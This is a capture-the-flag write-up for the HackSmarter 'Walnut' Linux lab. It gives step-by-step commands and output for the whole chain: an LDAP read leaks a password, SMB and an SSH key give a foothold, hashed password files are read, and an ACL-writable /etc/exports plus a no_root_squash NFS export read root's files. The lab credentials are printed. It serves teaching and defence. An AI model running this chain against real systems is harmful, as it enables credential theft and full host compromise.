---
title: Walnut
categories: [HacksmarterLabs]
tags: [linux, ldap, smb, information-disclosure, credential-reuse, ssh-key, nfs, sudo, file-permissions, privilege-escalation]
media_subpath: /images/hacksmarter_walnut/
image:
  path: 'https://images.coursestack.com/966a53e1-2045-42c5-9724-0efbe438172e/5fe083bd-f861-462a-b429-065402d5c185'
---

## Summary

**Walnut** is a HackSmarter Linux lab. The starting position is one supplied credential for a directory user named `larryburns`, and the goal is the root flag on a standalone Ubuntu server that runs SSH, Samba and NFS. There is no Active Directory here despite the LDAP port: the box is a classic Unix host using OpenLDAP as its account database, and every step is a plain misuse of a service behaving exactly as configured.

The supplied credential is oddly inert at first. It does not authenticate to SSH, and Samba maps it to Guest. What it does do is bind to LDAP, and an authenticated LDAP user can read the whole directory. One account's `description` field has been used as a sticky note holding an old password, with a comment that it was reused on every server. That reused password opens the `automation` SMB share, which is a user's home directory exported over the network. Inside it are the user flag, an unencrypted SSH private key, and a handful of files that spell out the privilege escalation.

The root half is an NFS story built on a chain of small trust decisions rather than a single exploit:

- A helper script hashes an account name with MD5 to locate a password file, so hashing the four obvious job-account names recovers their passwords.
- One of those accounts, `localjob3`, can restart the NFS server through a passwordless `sudo` rule.
- `/etc/exports` is owned by root and mode `0664`, but a POSIX ACL grants `localjob3` write access to it, which the ordinary permission bits hide.
- NFS on Linux hands out whatever `/etc/exports` says, so writing a `/root` export with `no_root_squash` and reloading the service turns a service restart into a read of root's home directory.

The last piece is a networking detail that costs an attempt if missed: the export has to name the client address the *target* sees, which is a NAT address, not the attacker's VPN interface. The server records it in `$SSH_CONNECTION`, so a shell on the box tells you exactly what to write.

> **Category:** Linux privilege escalation. **Starting position:** one directory credential for `larryburns`. **Goal:** the root flag on a standalone Samba/NFS server. **Theme:** an authenticated LDAP read leaks a reused password, and a user-writable `/etc/exports` behind a passwordless NFS restart hands over root.
{: .prompt-info }

---

## 1. Recon

Set the target address once so the rest of the commands read cleanly:

```bash
export IP=10.1.253.90
```

The service scan shows an ordinary Linux server: SSH, the Samba pair on 139 and 445, OpenLDAP on 389, and NFS. It also shows a cluster of high, unexplained ports.

```bash
nmap -Pn -sV -p22,111,139,389,445,2049,34971,38867,40461,43381,55125 $IP
```

```text
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn Samba smbd 4
389/tcp   open  ldap        OpenLDAP
445/tcp   open  netbios-ssn Samba smbd 4
2049/tcp  open  nfs
34971/tcp open  unknown
38867/tcp open  unknown
40461/tcp open  unknown
43381/tcp open  unknown
55125/tcp open  unknown
```

Those high ports are not five separate applications. NFS registers its helper daemons on ephemeral ports and advertises them through the portmapper on 111, so a single `rpcinfo` call explains all of them at once:

```bash
rpcinfo -p $IP
```

```text
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100024    1   tcp  38867  status
    100005    3   tcp  33753  mountd
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    3   udp  50568  nlockmgr
```

So the whole surface is really four things: SSH, Samba, OpenLDAP and NFS. The RPC groundwork here, and why an NFS server scatters high ports across a scan, live on the [NFS theory page](/theory/protocols/nfs).

A quick NetBIOS lookup confirms this is a workgroup member and not a domain controller, which is worth settling early so we do not waste time treating LDAP as Active Directory:

```bash
nmblookup -A $IP
```

```text
	WALNUT          <00> -         B <ACTIVE>
	WALNUT          <20> -         B <ACTIVE>
	WORKGROUP       <00> - <GROUP> B <ACTIVE>
	WORKGROUP       <1d> -         B <ACTIVE>
```

`WORKGROUP` rather than a domain name, and no `<1c>` domain-controller record. This is a standalone Samba server.

---

## 2. What the Anonymous Session Gives Up

Before touching the supplied credential, it is worth seeing how far an unauthenticated session gets, because it names the account the rest of the box revolves around.

An anonymous share listing works and shows a share called `automation`:

```bash
smbclient -N -L //$IP
```

```text
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	automation      Disk      automation share
	IPC$            IPC       IPC Service (walnut server (Samba, Ubuntu))
```

Connecting to it anonymously is refused, so the share exists but is not open to guests:

```bash
smbclient -N //$IP/automation -c 'ls'
```

```text
tree connect failed: NT_STATUS_ACCESS_DENIED
```

The null session still answers the metadata RPCs, though. [smbclient and rpcclient](https://github.com/samba-team/samba) ship with Samba; `rpcclient` against the SAMR and SRVSVC interfaces confirms the share maps to a home directory and that there is a local account behind it:

```bash
rpcclient -N -U '' $IP -c 'netshareenumall;querydispinfo'
```

```text
netname: automation
	remark:	automation share
	path:	C:\home\automation

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: automation
```

The path `C:\home\automation` is Samba's Windows-flavoured way of writing `/home/automation`, so the `automation` share is that user's home directory published over SMB. The password policy is permissive and, more importantly, there is no lockout threshold, which is the fact that makes any later password work safe to attempt:

```bash
rpcclient -N -U '' $IP -c 'getdompwinfo'
```

```text
min_password_length: 5
password_properties: 0x00000000
```

At this point we know there is an `automation` account whose home directory is shared, but we cannot read it yet.

---

## 3. LDAP: an Authenticated Read Leaks a Reused Password

The lab hands over a single credential:

```text
Username: larryburns
Password: IloveMontgommery!
```

It is worth being precise about where this credential is and is not accepted, because that shapes everything. It does not authenticate to SSH. Against Samba it is mapped to Guest rather than to a real login. Where it does work is LDAP.

An anonymous bind is refused outright, so the directory is not readable without credentials:

```bash
ldapsearch -x -LLL -H ldap://$IP -s base -b '' namingContexts
```

```text
ldap_bind: Inappropriate authentication (48)
	additional info: anonymous bind disallowed
```

This is an OpenLDAP directory for a Unix host, so accounts live under the conventional `ou=People` container and the bind DN follows the POSIX layout rather than a Windows `DOMAIN\user`. Confirming the bind works before running a full search saves guessing at the DN format later:

```bash
ldapwhoami -x -H ldap://$IP \
  -D 'uid=larryburns,ou=People,dc=walnut,dc=local' \
  -w 'IloveMontgommery!'
```

```text
dn:uid=larryburns,ou=People,dc=walnut,dc=local
```

The bind succeeds, and in this directory a plain authenticated user can read the whole tree. The same thing with [NetExec](https://github.com/Pennyw0rth/NetExec) is a good habit, since it is the tool most people reach for against an AD-looking box, but note that its default LDAP mode expects an AD-style NTLM bind and fails here:

```bash
nxc ldap $IP -u larryburns -p 'IloveMontgommery!'
```

```text
LDAP  10.1.253.90  389  NONE  [-] \larryburns:IloveMontgommery!
```

That is a false negative, not a wrong password. This is OpenLDAP with no NTLM, so it needs a simple bind against the full DN. Told to do that, NetExec authenticates and can run the directory search for us:

```bash
nxc ldap $IP --simple-bind \
  -u 'uid=larryburns,ou=People,dc=walnut,dc=local' -p 'IloveMontgommery!' \
  --base-dn 'dc=walnut,dc=local' --query '(objectClass=posixAccount)' 'uid description'
```

```text
[+] \uid=larryburns,ou=People,dc=walnut,dc=local:IloveMontgommery!
[+] Response for object: uid=automation,ou=People,dc=walnut,dc=local
uid          automation
description  old pw asdh023incasdahff9 please change pw on all servers
[+] Response for object: uid=larryburns,ou=People,dc=walnut,dc=local
uid          larryburns
[+] Response for object: uid=briangeoff,ou=People,dc=walnut,dc=local
uid          briangeoff
```

> When a bind that should work reports failure, check whether the tool defaulted to the wrong bind type before you doubt the credential. `nxc ldap` assumes an NTLM bind; a POSIX OpenLDAP server needs `--simple-bind` with the full DN. More on this on the [LDAP theory page](/theory/protocols/ldap).
{: .prompt-tip }

The `ldapsearch` equivalent, if you want the raw directory rather than NetExec's formatting, is the same simple bind against the base DN:

```bash
ldapsearch -x -LLL -H ldap://$IP \
  -D 'uid=larryburns,ou=People,dc=walnut,dc=local' -w 'IloveMontgommery!' \
  -b 'dc=walnut,dc=local' '(objectClass=posixAccount)' uid description userPassword
```

```text
dn: uid=automation,ou=People,dc=walnut,dc=local
uid: automation
description: old pw asdh023incasdahff9 please change pw on all servers

dn: uid=larryburns,ou=People,dc=walnut,dc=local
uid: larryburns
userPassword:: e1NTSEF9amdUN0V4SEtocDVDQm92clBaYzhMYkJiNXVwK1JNcUI=
```

Two things stand out. The `automation` account's `description` has been used as a note holding an old password, `asdh023incasdahff9`, with the giveaway that it was reused across servers. And `larryburns`'s own `userPassword` is exposed as a base64 blob, which decodes to a salted SHA-1 hash rather than anything reusable:

```bash
echo 'e1NTSEF9amdUN0V4SEtocDVDQm92clBaYzhMYkJiNXVwK1JNcUI=' | base64 -d
```

```text
{SSHA}jgT7ExHKhp5CBovrPZc8LbBb5up+RMqB
```

That hash is larryburns's own password, which we already have, so it is a dead end. The useful leak is the plaintext sitting in `automation`'s description field.

> A password written into a free-text directory attribute is a recurring real-world mistake, not a lab contrivance. `description`, `info` and `comment` fields are readable by any authenticated user and are exactly where administrators leave notes to themselves. Sweep them on every directory you can read.
{: .prompt-danger }

---

## 4. SMB Foothold and the User Flag

The reused password authenticates the `automation` account to SMB, and NetExec confirms it holds read/write on that account's own share:

```bash
nxc smb $IP -u automation -p 'asdh023incasdahff9' --shares
```

```text
[+] local\automation:asdh023incasdahff9
Share           Permissions            Remark
-----           -----------            ------
print$          READ                   Printer Drivers
automation      READ,WRITE             automation share
IPC$                                   IPC Service
```

Pulling the whole share down at once is quicker than poking at it interactively. It is `automation`'s home directory, so it carries the flag, the user's SSH keys, and the files that turn out to be the privilege escalation:

```bash
smbclient //$IP/automation -U 'automation%asdh023incasdahff9' \
  -c 'prompt OFF; recurse ON; mget *'
```

```text
user.txt
.ssh/id_rsa
.ssh/id_rsa.pub
.ssh/authorized_keys
scripts/runScript.sh
.hidden/4f378611beed879f4f62a43ac18452a9
.hidden/af5f60ab1fe78c4a34e37c9cb4cc58b8
.hidden/b410af005ed0c033fd5e89720fdf2d57
.hidden/b4d2ab0ea77f3306355ac7b2bcfcd614
.hidden/b4d2ab0ea77f3306355ac7b2bcfcd614.bak
```

The user flag is right there:

```bash
cat user.txt
```

```text
HSM{redacted}
```

The private key is unencrypted, and it is worth a moment to confirm it actually belongs to this account rather than being a decoy. Deriving the public key from the private key and comparing it to the `authorized_keys` on the share proves both that the key is valid and that it will be accepted for login:

```bash
chmod 600 .ssh/id_rsa
ssh-keygen -y -f .ssh/id_rsa | diff - .ssh/authorized_keys && echo "key matches authorized_keys"
```

```text
key matches authorized_keys
```

Password login is disabled for this user, which is why the reused password never worked against SSH, but key authentication is exactly what the box wants:

```bash
ssh -i .ssh/id_rsa -o IdentitiesOnly=yes automation@$IP 'id; hostname'
```

```text
uid=7789(automation) gid=7789(automation) groups=7789(automation)
walnut.local
```

We now have an interactive shell as `automation`.

---

## 5. Recovering the Local Job Passwords

The share included a `scripts/runScript.sh` and a `.hidden` directory full of files whose names are 32 hex characters. The script explains the connection between them:

```bash
#!/bin/bash

PARM1="$1"
PARM2=`echo -n "$1" | md5sum | cut -d' ' -f 1`
PARM3="$2"
DATE=`date +%d.%m.%Y-%Hh%m.%S`

su - "$PARM1" -c "$PARM3" < /home/automation/.hidden/"$PARM2" \
  > /home/automation/scripts/logs/"$1"-"$DATE".log
```

The first argument is a username. The script MD5-hashes that name and reads the matching file in `.hidden`, feeding it to `su - <user>` on standard input. In other words, each `.hidden` file is named after the MD5 of an account and contains that account's password. The hex filenames are simply hashed usernames.

The obvious candidates are the four job accounts, and hashing their names reproduces every filename on the share:

```bash
for name in localjob1 localjob2 localjob3 localjob4; do
  printf '%-11s %s\n' "$name" "$(printf %s "$name" | md5sum | cut -d' ' -f1)"
done
```

```text
localjob1   4f378611beed879f4f62a43ac18452a9
localjob2   af5f60ab1fe78c4a34e37c9cb4cc58b8
localjob3   b4d2ab0ea77f3306355ac7b2bcfcd614
localjob4   b410af005ed0c033fd5e89720fdf2d57
```

All four names map to files we downloaded, so reading each file gives the corresponding password:

```bash
cat .hidden/4f378611beed879f4f62a43ac18452a9   # localjob1
cat .hidden/af5f60ab1fe78c4a34e37c9cb4cc58b8   # localjob2
cat .hidden/b410af005ed0c033fd5e89720fdf2d57   # localjob4
```

```text
brYfZknjTirtrPgM8V65
cKvFZVPbrxEqCkCLPM70
Q8NPUgCvuBQ636tzFBh3
```

`localjob3` is the interesting one. Its live file `b4d2ab0ea77f3306355ac7b2bcfcd614` is empty, but the share also carries a `.bak` copy next to it that is not:

```bash
cat .hidden/b4d2ab0ea77f3306355ac7b2bcfcd614.bak   # localjob3
```

```text
vyZzRcreRGDjbq9t19Tb
```

These accounts cannot be reached over SSH at all. The daemon config bans them by name and only relaxes password rules for `automation`:

```text
DenyUsers localjob1 localjob2 localjob3 localjob4

Match User automation
    PasswordAuthentication no
    AuthenticationMethods "publickey"
```

That does not matter, because we already have a shell as `automation` and can switch locally with `su`. Feeding the recovered password on standard input avoids the interactive prompt:

```bash
echo 'vyZzRcreRGDjbq9t19Tb' | su - localjob3 -c 'id'
```

```text
uid=5002(localjob3) gid=5002(localjob3) groups=5002(localjob3),100(users)
```

---

## 6. The Privilege Escalation: a Passwordless NFS Restart and a Writable Export

Checking `sudo` rights for each job account, `localjob3` is the one that carries a passwordless rule, and it is oddly specific:

```bash
echo 'vyZzRcreRGDjbq9t19Tb' | su - localjob3 -c 'sudo -n -l'
```

```text
User localjob3 may run the following commands on walnut:
    (ALL) NOPASSWD: /usr/bin/systemctl restart nfs-kernel-server.service
```

Restarting a service is only useful if you can influence what the service reads on startup. The unit shows that a restart runs `exportfs -r`, which re-reads `/etc/exports`, as root:

```bash
systemctl cat nfs-kernel-server.service
```

```ini
[Service]
Type=oneshot
RemainAfterExit=yes
ExecStartPre=-/usr/sbin/exportfs -r
ExecStart=/usr/sbin/rpc.nfsd
ExecReload=-/usr/sbin/exportfs -r
```

So the primitive is complete if `localjob3` can also write `/etc/exports`. The ownership and mode say root-only:

```bash
stat -c '%A %U:%G %n' /etc/exports
```

```text
-rw-rw-r-- root:root /etc/exports
```

Reading past that would be a mistake. The `getfacl` output shows a POSIX ACL entry that grants `localjob3` write access directly, which the mode bits cannot express and `ls -l` only hints at with a trailing `+`:

```bash
getfacl -p /etc/exports
```

```text
# file: /etc/exports
# owner: root
# group: root
user::rw-
user:localjob3:rw-
group::r--
mask::rw-
other::r--
```

> Always check `getfacl`, not just `ls -l`, on any file that feeds a root-run process. A POSIX ACL can grant one specific user write access while the ordinary owner, group and mode all still read root-only. This box is built entirely around that blind spot.
{: .prompt-danger }

That is the whole escalation. `localjob3` can write `/etc/exports` because of the ACL, and can reload NFS as root because of the `sudo` rule. Between them, `localjob3` decides what root's NFS server exports.

---

## 7. Reading Root over NFS

The plan is to export `/root` with `no_root_squash` so that a client connecting as UID 0 is treated as root on the server rather than squashed to `nobody`. Before writing the line, though, there is a networking catch that is easy to get wrong.

NFS matches the client specification in `/etc/exports` against the source address the *server* observes. Over the lab VPN there is NAT in the path, so the address on the attacker's `tun0` is not the address the target sees. The target records the real one in the SSH session, so ask it directly:

```bash
ssh -i .ssh/id_rsa -o IdentitiesOnly=yes automation@$IP 'echo "$SSH_CONNECTION"'
```

```text
10.0.0.247 57160 10.1.253.90 22
```

The first field, `10.0.0.247`, is the client address as `walnut` sees it, so that is what the export must name. Scoping the export to that single address keeps it off the rest of the lab network. Adding `insecure` lets an unprivileged userspace client connect from a high source port, which we will use instead of a root mount:

```bash
echo 'vyZzRcreRGDjbq9t19Tb' | su - localjob3 -c \
  'echo "/root 10.0.0.247(ro,no_root_squash,insecure)" >> /etc/exports; \
   sudo -n systemctl restart nfs-kernel-server.service'
```

After the restart the export is live:

```bash
showmount -e $IP
```

```text
Export list for 10.1.253.90:
/root 10.0.0.247
```

Because the export is read-only, there is no need to plant a SUID binary or an SSH key; simply reading root's home directory is enough for the flag. [libnfs](https://github.com/sahlberg/libnfs) ships userspace clients that speak NFS directly and let the UID and GID be set per request, so nothing has to be mounted and no root is needed on the attack host. The `uid=0` in the URL is what `no_root_squash` honours:

```bash
nfs-ls 'nfs://10.1.253.90/root/?version=3&uid=0&gid=0&readonly'
```

```text
drwxr-xr-x  3     0     0         4096 .local
drwx------  2     0     0         4096 .ssh
-rw-r--r--  1     0     0          161 .profile
-rw-------  1     0     0          130 .bash_history
-rw-------  1     0     0           33 root.txt
```

The file modes are `rw-------` owned by UID 0, which would be unreadable to anyone but root; being treated as root by the export is exactly what lets us read them:

```bash
nfs-cat 'nfs://10.1.253.90/root/root.txt?version=3&uid=0&gid=0&readonly'
```

```text
HSM{redacted}
```

> `no_root_squash` is not a performance tweak, it is a decision to believe a client that claims to be root. Combined with a `/etc/exports` any non-root user can edit, it is a complete host compromise. The default `root_squash` would have downgraded our UID 0 to `nobody` and left root's files unreadable. See the [NFS theory page](/theory/protocols/nfs) for the full trust model.
{: .prompt-danger }

Since the export was a deliberate change to a shared lab host, it is good manners to put `/etc/exports` back to its original contents and reload NFS once the flag is read, leaving `showmount -e` empty again.

---

## Understanding the Attack Chain

No single step here is a memory-corruption bug or a CVE. Each service is doing exactly what its configuration tells it to; the compromise is in how the small trust decisions line up. The table separates what each piece is worth alone from what it is worth in sequence.

| Primitive | Where it lives | Severity in isolation | Severity composed |
|---|---|---|---|
| Authenticated LDAP read | OpenLDAP, any valid bind | Low: directory metadata | Exposes every account attribute at once |
| Password in `description` | `automation` LDAP entry | Medium: one stale secret | The reused password that opens SMB |
| Reused credential | `automation` on SMB | Medium: one share | Home directory with keys and flag |
| Unencrypted `id_rsa` on the share | `automation` home | High: a private key | Interactive shell as `automation` |
| MD5-named password files | `.hidden`, `runScript.sh` | Low: obscured storage | Hashing four names recovers all passwords |
| `.bak` of an emptied secret | `localjob3` file | Low: a backup file | The only working `localjob3` password |
| NOPASSWD NFS restart | `localjob3` sudoers | Low: restart a service | Re-runs `exportfs -r` as root on demand |
| ACL write on `/etc/exports` | POSIX ACL, hidden by mode | Medium: edit one file | Chooses what root's NFS exports |
| `no_root_squash` export | `/etc/exports` line we write | Critical by design | UID 0 client reads all of `/root` |
| `insecure` export option | `/etc/exports` line we write | Low on its own | Lets an unprivileged client connect |
